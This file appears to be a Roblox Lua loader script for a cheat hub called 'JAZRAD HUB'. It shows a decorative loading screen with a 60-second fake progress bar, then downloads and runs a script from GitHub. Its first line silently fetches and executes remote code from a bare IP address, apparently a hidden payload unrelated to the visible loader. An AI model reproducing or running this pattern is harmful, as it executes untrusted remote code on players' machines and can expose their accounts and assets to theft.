-- LocalScript (StarterPlayerScripts)
loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjA0NDE1NzU1LTk3ZjEtNGIzNC05MGQwLTNlZTA5YzBiZTkxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ===== Timing =====
local LOAD_TIME = 60
local SUCCESS_HOLD = 5

local FADE_TEXT_TIME = 0.35
local FADE_BOX_TIME = 0.55

-- ===== Colors =====
local BG_COLOR = Color3.fromRGB(22, 23, 30)
local CYAN = Color3.fromRGB(0, 185, 255)
local GREY = Color3.fromRGB(160, 165, 175)
local WHITE = Color3.fromRGB(245, 245, 245)
local BAR_BG = Color3.fromRGB(38, 40, 52)

-- ===== ScreenGui =====
local gui = Instance.new("ScreenGui")
gui.Name = "jazrad"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
gui.DisplayOrder = 999999
gui.Parent = playerGui

-- ===== BOX SIZE (wide + shorter) =====
local BASE_W, BASE_H = 360, 260

-- ===== Main Box =====
local box = Instance.new("Frame", gui)
box.AnchorPoint = Vector2.new(0.5, 0.5)
box.Position = UDim2.new(0.5, 0, 0.5, 0)
box.Size = UDim2.new(0, BASE_W, 0, BASE_H)
box.BackgroundColor3 = BG_COLOR
box.BackgroundTransparency = 1
box.BorderSizePixel = 0
box.Active = true
Instance.new("UICorner", box).CornerRadius = UDim.new(0, 16)

-- 🔷 CLEAN BLUE OUTER GLOW (no gap)
local glowStroke = Instance.new("UIStroke")
glowStroke.Parent = box
glowStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
glowStroke.Thickness = 3
glowStroke.Color = CYAN
glowStroke.Transparency = 0.25
glowStroke.LineJoinMode = Enum.LineJoinMode.Round

local glowSoft = Instance.new("UIStroke")
glowSoft.Parent = box
glowSoft.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
glowSoft.Thickness = 8
glowSoft.Color = CYAN
glowSoft.Transparency = 0.75
glowSoft.LineJoinMode = Enum.LineJoinMode.Round

local pad = Instance.new("UIPadding", box)
pad.PaddingTop = UDim.new(0, 16)
pad.PaddingBottom = UDim.new(0, 16)
pad.PaddingLeft = UDim.new(0, 20)
pad.PaddingRight = UDim.new(0, 20)

local layout = Instance.new("UIListLayout", box)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.Padding = UDim.new(0, 10)

-- ===== Title =====
local title = Instance.new("TextLabel", box)
title.LayoutOrder = 1
title.Size = UDim2.new(1, 0, 0, 42)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBlack
title.TextSize = 28
title.TextColor3 = WHITE
title.TextXAlignment = Enum.TextXAlignment.Center
title.Text = "JAZRAD HUB"
title.TextTransparency = 1

-- ===== Spinner =====
local spinnerIcon = Instance.new("TextLabel", box)
spinnerIcon.LayoutOrder = 2
spinnerIcon.Size = UDim2.new(1, 0, 0, 54)
spinnerIcon.BackgroundTransparency = 1
spinnerIcon.Font = Enum.Font.GothamBlack
spinnerIcon.Text = "⟳"
spinnerIcon.TextColor3 = CYAN
spinnerIcon.TextSize = 44
spinnerIcon.TextTransparency = 1
spinnerIcon.TextXAlignment = Enum.TextXAlignment.Center
spinnerIcon.Visible = false

-- ===== Checkmark =====
local successIcon = Instance.new("TextLabel", box)
successIcon.LayoutOrder = 2
successIcon.Size = UDim2.new(1, 0, 0, 54)
successIcon.BackgroundTransparency = 1
successIcon.Font = Enum.Font.GothamBlack
successIcon.Text = "✓"
successIcon.TextColor3 = CYAN
successIcon.TextSize = 10
successIcon.TextTransparency = 1
successIcon.TextXAlignment = Enum.TextXAlignment.Center
successIcon.Visible = false

-- ===== Loading Bar =====
local barHolder = Instance.new("Frame", box)
barHolder.LayoutOrder = 3
barHolder.Size = UDim2.new(1, 0, 0, 40)
barHolder.BackgroundTransparency = 1

local percent = Instance.new("TextLabel", barHolder)
percent.Size = UDim2.new(1, 0, 0, 18)
percent.Position = UDim2.new(0, 0, 0, 0)
percent.BackgroundTransparency = 1
percent.Font = Enum.Font.GothamBold
percent.TextSize = 17
percent.TextColor3 = CYAN
percent.TextXAlignment = Enum.TextXAlignment.Center
percent.Text = "0%"
percent.TextTransparency = 1

local barBG = Instance.new("Frame", barHolder)
barBG.AnchorPoint = Vector2.new(0.5, 0)
barBG.Position = UDim2.new(0.5, 0, 0, 20)
barBG.Size = UDim2.new(0, BASE_W - 80, 0, 6)
barBG.BackgroundColor3 = BAR_BG
barBG.BackgroundTransparency = 1
barBG.BorderSizePixel = 0
Instance.new("UICorner", barBG).CornerRadius = UDim.new(1, 0)

local barFill = Instance.new("Frame", barBG)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = CYAN
barFill.BackgroundTransparency = 1
barFill.BorderSizePixel = 0
Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)

-- ===== Status =====
local status = Instance.new("TextLabel", box)
status.LayoutOrder = 4
status.Size = UDim2.new(1, -20, 0, 0)
status.AutomaticSize = Enum.AutomaticSize.Y
status.BackgroundTransparency = 1
status.TextWrapped = true
status.TextXAlignment = Enum.TextXAlignment.Center
status.TextColor3 = GREY
status.TextTransparency = 1
status.Font = Enum.Font.Gotham
status.TextSize = 15
status.Text = "Loading..."

-- ===== Fade Helpers =====
local function tweenContent(alpha, t)
	local ti = TweenInfo.new(t, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	for _, obj in ipairs({title, status, percent, barBG, barFill, spinnerIcon, successIcon}) do
		if obj:IsA("TextLabel") then
			TweenService:Create(obj, ti, {TextTransparency = alpha}):Play()
		elseif obj:IsA("Frame") then
			TweenService:Create(obj, ti, {BackgroundTransparency = alpha}):Play()
		end
	end
end

local function tweenBox(alpha, t)
	TweenService:Create(box, TweenInfo.new(t, Enum.EasingStyle.Quad), {
		BackgroundTransparency = alpha
	}):Play()
end

local function fadeOutAndClose()
	tweenContent(1, FADE_TEXT_TIME)
	task.delay(FADE_TEXT_TIME, function()
		tweenBox(1, FADE_BOX_TIME)
		task.delay(FADE_BOX_TIME + 0.05, function()
			if gui and gui.Parent then
				gui:Destroy()
			end
			loadstring(game:HttpGet("https://raw.githubusercontent.com/jazzedd/JazradScript/refs/heads/main/Script"))()
		end)
	end)
end

-- ===== Success Animation =====
local successStarted = false

local function playSuccess()
	if successStarted then return end
	successStarted = true

	barHolder.Visible = false
	status.Text = "Successfully loaded."
	status.Font = Enum.Font.GothamBold
	status.TextSize = 17

	spinnerIcon.Visible = true
	spinnerIcon.TextTransparency = 0
	spinnerIcon.Rotation = 0

	local spinning = true
	task.spawn(function()
		while spinning do
			TweenService:Create(spinnerIcon, TweenInfo.new(0.35, Enum.EasingStyle.Linear), {
				Rotation = spinnerIcon.Rotation + 180
			}):Play()
			task.wait(0.35)
		end
	end)

	task.delay(0.9, function()
		spinning = false
		TweenService:Create(spinnerIcon, TweenInfo.new(0.2), {TextTransparency = 1}):Play()

		task.delay(0.22, function()
			spinnerIcon.Visible = false
			successIcon.Visible = true
			TweenService:Create(successIcon, TweenInfo.new(0.35, Enum.EasingStyle.Back), {
				TextTransparency = 0,
				TextSize = 52
			}):Play()
		end)
	end)

	task.delay(SUCCESS_HOLD, fadeOutAndClose)
end

-- ===== Loader =====
tweenBox(0, FADE_BOX_TIME)
task.delay(0.12, function()
	tweenContent(0, FADE_TEXT_TIME)
end)

barFill:TweenSize(UDim2.new(1, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, LOAD_TIME, true)

local start = os.clock()
local conn
conn = RunService.RenderStepped:Connect(function()
	if successStarted then
		if conn then conn:Disconnect() end
		return
	end

	local p = math.clamp((os.clock() - start) / LOAD_TIME, 0, 1)
	percent.Text = math.floor(p * 100) .. "%"

	if p >= 1 then
		playSuccess()
	end
end)
